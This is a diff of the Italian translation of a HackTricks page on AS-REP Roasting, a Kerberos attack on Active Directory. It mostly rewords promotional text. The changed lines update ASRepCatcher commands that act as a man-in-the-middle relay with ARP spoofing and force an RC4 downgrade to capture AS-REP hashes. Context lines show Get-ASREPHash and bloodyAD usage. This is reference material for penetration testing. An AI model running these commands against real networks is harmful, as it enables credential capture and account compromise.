@@ -7,7 +7,7 @@
 Altri modi per supportare HackTricks:
 
 * Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
@@ -16,10 +16,10 @@ Altri modi per supportare HackTricks:
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!
+Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug!
 
 **Insight sull'Hacking**\
-Coinvolgiti con contenuti che esplorano l'emozione e le sfide dell'hacking
+Coinvolgiti con contenuti che approfondiscono l'emozione e le sfide dell'hacking
 
 **Notizie sull'Hacking in Tempo Reale**\
 Resta aggiornato con il mondo dell'hacking in rapida evoluzione attraverso notizie e approfondimenti in tempo reale
@@ -70,7 +70,7 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-AS-REP Roasting con Rubeus genererà un 4768 con un tipo di crittografia di 0x17 e un tipo di preautenticazione di 0.
+Il cracking AS-REP Roasting con Rubeus genererà un 4768 con un tipo di crittografia di 0x17 e un tipo di preautenticazione di 0.
 {% endhint %}
 
 ### Cracking
@@ -94,18 +94,18 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ```
 {% endcode %}
 
-## ASreproast senza credenziali
-Senza la conoscenza degli utenti che non richiedono l'autenticazione Kerberos predefinita. Un attaccante può utilizzare una posizione di uomo nel mezzo per catturare i pacchetti AS-REP mentre attraversano la rete.<br>
-[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) ci consente di farlo. Inoltre, lo strumento <ins>costringe le workstation client a utilizzare RC4</ins> modificando la negoziazione Kerberos.
+## ASREProast senza credenziali
+Un attaccante può utilizzare una posizione di uomo nel mezzo per catturare i pacchetti AS-REP mentre attraversano la rete <ins>senza dover fare affidamento sulla disabilitazione della pre-autenticazione Kerberos.</ins> Pertanto, funziona per tutti gli utenti sulla VLAN.<br>
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ci consente di farlo. Inoltre, lo strumento <ins>costringe le workstation client a utilizzare RC4</ins> modificando la negoziazione Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
-ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
+ASRepCatcher relay -dc $DC_IP
 
 # Disabling ARP spoofing, the mitm position must be obtained differently
-ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
+ASRepCatcher relay -dc $DC_IP --disable-spoofing
 
 # Passive listening of AS-REP packets, no packet alteration
-ASrepCatcher.py listen
+ASRepCatcher listen
 ```
 ## Riferimenti
 
@@ -123,7 +123,7 @@ Interagisci con contenuti che esplorano l'emozione e le sfide dell'hacking
 **Notizie sull'Hacking in Tempo Reale**\
 Resta aggiornato sul mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale
 
-**Ultime Novità**\
+**Ultime Annunci**\
 Rimani informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali della piattaforma
 
 **Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi!
@@ -138,6 +138,6 @@ Altri modi per supportare HackTricks:
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di Github.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
 </details>
